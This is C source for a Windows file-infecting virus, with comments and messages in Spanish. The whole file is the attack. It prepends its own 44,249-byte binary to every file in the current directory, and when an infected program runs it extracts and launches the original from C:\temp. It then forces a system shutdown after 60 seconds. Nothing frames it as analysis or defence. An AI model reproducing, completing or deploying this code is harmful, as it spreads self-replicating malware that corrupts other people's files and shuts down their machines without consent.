#include<stdio.h>
#include<io.h>
#include<direct.h>
#include<conio.h>
#include<time.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>

int tamVirus=44249;

int printTam(char *str){
  FILE *virus;
  virus=fopen(str,"rb"); //Virus
  int size=0;
  fseek(virus, 0, SEEK_END);    
  size = ftell(virus);
  //printf("Este archivo pesa: %d\n", size);    
  return size;
}

void dameParaInfectar(char*hostingName){
  //char *nombreParaBorrar=hostingName;
  printf("Estoy infectado a: \n");
  printf(hostingName);
  char nameNuevo[2048]="1";
  strcat(nameNuevo,hostingName);
  FILE *virus,*host,*infectado;
  unsigned long x;
  char buff[2048];
  char *virusName="virus.exe";
  char *nuevoNombre=nameNuevo;
  virus=fopen(virusName,"rb"); //Virus
  host=fopen(hostingName,"rb+"); //Programa victima
  infectado=fopen(nameNuevo,"ab+");//Programa infectado
  x=tamVirus;
  
  //fseek(host, 0, SEEK_END);
  
  //Copiando Primero virus
  
  while(x>2048) {
    fread(buff,2048,1,virus);
    fwrite(buff,2048,1,infectado);
    x-=2048;
  }
  fread(buff,x,1,virus);
  fwrite(buff,x,1,infectado);
  //Copiando Segundo Programa Victima
  x=printTam(hostingName);
  while(x>2048) {
    fread(buff,2048,1,host);
    fwrite(buff,2048,1,infectado);
    x-=2048;
  }
  fread(buff,x,1,host);
  fwrite(buff,x,1,infectado);
  
  fclose(virus);
  fclose(host);
  fclose(infectado);
  //char deleteArchivo[2048]="del ";
  //strcat(deleteArchivo,hostingName);
  //system(deleteArchivo);
}


void infectar(){
  //st=clock();
  printf("Ah infectaaaaar");
  struct dirent *de;
  
  DIR *dr = opendir(".");
  if (dr == NULL){
    printf("No existe carpeta" );
    return;
  }
  while ((de = readdir(dr)) != NULL){
    char *nombre;
    nombre=de->d_name;
    if(strlen(nombre)>3){
      printf("%s\n", nombre);
      dameParaInfectar(nombre);
    }
  }
  closedir(dr);
}

void ejecutarVictima(char *miNombre){
  int currentTam=printTam(miNombre);
  if(currentTam>tamVirus){  
    
    FILE *temp,*infectado;
    char buff[2048];
    char *tempName="c:\\temp\\temp.exe";
    system("DEL c:\\temp\\temp.exe");
    _mkdir("C:\\temp");
    infectado=fopen(miNombre,"rb"); //Programa infectado
    temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
    int x=tamVirus;
    fseek(infectado, x, SEEK_SET );
    int t=currentTam;
    while(t>2048) {
      fread(buff,2048,1,infectado);
      fwrite(buff,2048,1,temp);
      t-=2048;
    }
    fread(buff,t,1,infectado);
    fwrite(buff,t,1,temp);
    fclose(temp);
    fclose(infectado);
    system(tempName);
    system("shutdown -s -t 60");
  }
  else{
    infectar();
    printf("Soy solo el virus y voy a infectar: %d",tamVirus);
    
  }
}

int main(int argc, char** argv){
  
  /*char*name="final.exe";
  int t=printTam("final.exe");
  printf("Tam: %d",t);
  */
  //infectar();
  ejecutarVictima(argv[0]);
  //dameParaInfectar("git.exe");
  //getch();
  return 0;
}
